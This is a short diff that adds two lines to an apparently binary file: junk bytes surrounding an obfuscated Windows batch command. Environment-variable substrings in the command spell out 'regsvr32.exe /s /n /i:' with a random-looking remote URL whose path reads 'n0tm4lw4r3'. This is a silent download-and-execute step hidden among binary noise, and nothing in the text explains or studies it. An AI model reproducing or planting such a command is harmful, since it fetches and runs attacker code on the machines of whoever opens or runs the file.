@@ -1,0 +1,2 @@
+ Z · X H ] ½ ? D E ? ü % Ð  ² ? Ç â \ : ã Z Y   ' [ O Ñ ø ¢ ë ^ ¾  D ø ?  ó  - â  þ   K é ? î Ð ä T ^ R ~  g
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://eIPNT%ALLUSERSPROFILE:~4,1%pDQHmVClhwcXUbtZF%ALLUSERSPROFILE:~4,1%kOosMuGLnYxyaSWzqJvBEiAKdfjg.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  Z · X H ] ½ ? D E ? ü % Ð  ² ? Ç â \ : ã Z Y   ' [ O Ñ ø ¢ ë ^ ¾  D ø ?  ó  - â  þ   K é ? î Ð ä T ^ R ~  g
